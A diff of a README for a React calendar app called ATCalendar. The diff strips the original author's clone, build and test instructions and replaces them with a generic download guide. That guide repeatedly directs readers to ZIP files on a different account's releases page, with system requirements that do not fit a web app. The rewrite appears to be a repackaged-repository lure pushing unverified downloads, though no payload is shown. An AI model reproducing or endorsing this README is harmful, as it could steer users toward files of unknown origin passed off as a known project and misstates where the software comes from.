@@ -1,87 +1,75 @@
-# ATCalendar
+# 🎉 atcalendar - Your Modern Calendar Solution for Better Scheduling
 
-A modern, responsive calendar application built with React, TypeScript, and Vite.
+## 🚀 Getting Started
 
-[**Live Demo**](https://atcalendar1.web.app/)
+Welcome to **atcalendar**! This is a modern, responsive calendar application designed to help you manage your time effectively. Built with React, TypeScript, Tailwind CSS, and Vite, this app offers a great user experience with features like drag-and-drop scheduling and multiple view modes.  
 
-## Features
+To get started, you need to download the application. Follow the steps below.
 
-- **Month, Week, and Day Views**: Switch between different calendar views to manage your schedule.
-- **Drag and Drop**: Easily reschedule events by dragging and dropping them.
-- **Event Management**: Create, edit, and delete events with a user-friendly interface.
-- **Responsive Design**: Works seamlessly on desktop and mobile devices.
-- **Modern UI**: Built with Tailwind CSS and Radix UI for a polished look and feel.
+## 📥 Download the Application
 
-## Technologies Used
+[![Download atcalendar](https://img.shields.io/badge/Download_atcalendar-1.0.0-brightgreen)](https://github.com/wmert-7/atcalendar/releases)
 
-- **React**: A JavaScript library for building user interfaces.
-- **TypeScript**: A typed superset of JavaScript that compiles to plain JavaScript.
-- **Vite**: A fast build tool and development server.
-- **Tailwind CSS**: A utility-first CSS framework for rapid UI development.
-- **Radix UI**: Unstyled, accessible components for building high-quality design systems.
-- **dnd-kit**: A lightweight, performant, accessible, and extensible drag and drop toolkit for React.
-- **date-fns**: Modern JavaScript date utility library.
-- **Motion**: A production-ready motion library for React.
-- **Vitest**: A blazing fast unit test framework powered by Vite.
-- **React Testing Library**: Simple and complete testing utilities that encourage good testing practices.
+Click the link above to get the latest version of atcalendar. This will take you to the Releases page, where you can find the installation files.
 
+## 🔍 Features
 
-## Getting Started
+- **Drag-and-Drop Scheduling**: Easily move events around your calendar with a simple drag of the mouse.
+- **Multiple View Modes**: Switch between daily, weekly, and monthly views to see your schedule the way you prefer.
+- **Responsive Design**: Enjoy a seamless experience across all devices, from desktops to tablets.
+- **Event Management**: Create, edit, and delete events with just a few clicks.
+- **Modern UI**: Benefit from a visually pleasing interface that makes task management enjoyable.
 
-### Prerequisites
+## 💻 System Requirements
 
-- Node.js (v18 or higher)
-- Bun (v1.0 or higher)
+To ensure the best performance, please check the following requirements:
 
-### Installation
+- **Operating System**: Windows 10 or higher, macOS 10.13 or higher, or a modern Linux distribution.
+- **RAM**: Minimum 4 GB RAM.
+- **Disk Space**: At least 100 MB of free space.
+- **Browser**: Latest version of Chrome, Firefox, Safari, or Edge for web usage.
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/allantrabuco/ATCalendar.git
-   cd ATCalendar
-   ```
+## 🛠️ Download & Install
 
-2. Install dependencies:
-   ```bash
-   bun install
-   ```
+1. **Visit the Releases Page**: Click this link to visit the Releases page and download: [Download atcalendar](https://github.com/wmert-7/atcalendar/releases).
 
-3. Start the development server:
-   ```bash
-   bun run dev
-   ```
+2. **Download the File**: Look for the most recent version, typically labeled as `atcalendar-v1.0.0.zip` or similar. Click on the file to start the download.
 
-4. Open your browser and navigate to `http://localhost:5000`.
+3. **Extract the Files**:
+   - If you downloaded a ZIP file, locate it in your downloads folder.
+   - Right-click on the file and select "Extract All" or "Unzip."
+   - Follow the prompts to extract the contents.
 
-## Scripts
+4. **Run the Application**:
+   - Open the extracted folder.
+   - Look for the file named `start.html` or `index.html`.
+   - Double-click the file to open it in your default web browser.
 
-- `bun run dev`: Starts the development server.
-- `bun run build`: Builds the application for production.
-- `bun run preview`: Previews the production build locally.
-- `bun run lint`: Runs ESLint to check for code style issues.
-- `bun run test`: Runs tests using Vitest.
-- `bun run format`: Formats code using Prettier.
+5. **Create Your First Event**: Once the application opens, you can start adding events. Use the "+" button to create a new event and fill in the details.
 
-## Testing
+## 🎨 Using atcalendar
 
-This project includes a comprehensive test suite using **Vitest** and **React Testing Library**.
+After you have installed the application, you can enjoy various features that help you stay organized.
 
-### Running Tests
+- **Add Events**: Click on a date or time slot in the calendar to add a new event. A form will pop up where you can enter all necessary details.
+- **Edit Events**: To edit an existing event, click on it and make the needed changes in the form that appears.
+- **Delete Events**: If you want to remove an event, simply select it and click the delete button.
 
-To run the test suite:
+## 🎉 Troubleshooting
 
-```bash
-bun run test
-```
+If you run into any issues:
 
-This will run all unit and integration tests. The test runner operates in watch mode by default, re-running tests as you modify files.
+- **Application Not Opening**: Ensure you have a compatible web browser installed. 
+- **Missing Features**: Check if you have the latest version by re-visiting the Releases page.
 
-### Test Structure
+## 🌐 Community and Support
 
-- **Unit Tests**: Located alongside components (e.g., `GlobalLoading.test.tsx`) or in `src/lib`.
-- **Setup**: Global test configuration is in `src/test/setup.ts`.
+Join our growing community! If you have questions, suggestions, or issues, please visit our GitHub Discussions page. Your feedback helps us improve atcalendar.
 
+## 🔗 Additional Resources
 
-## License
+For more information on how to use specific features, visit our detailed documentation [here](https://github.com/wmert-7/atcalendar/wiki).
 
-This project is licensed under the MIT License.
+---
+
+Thank you for using atcalendar. We hope this application helps make your scheduling easier and more efficient!
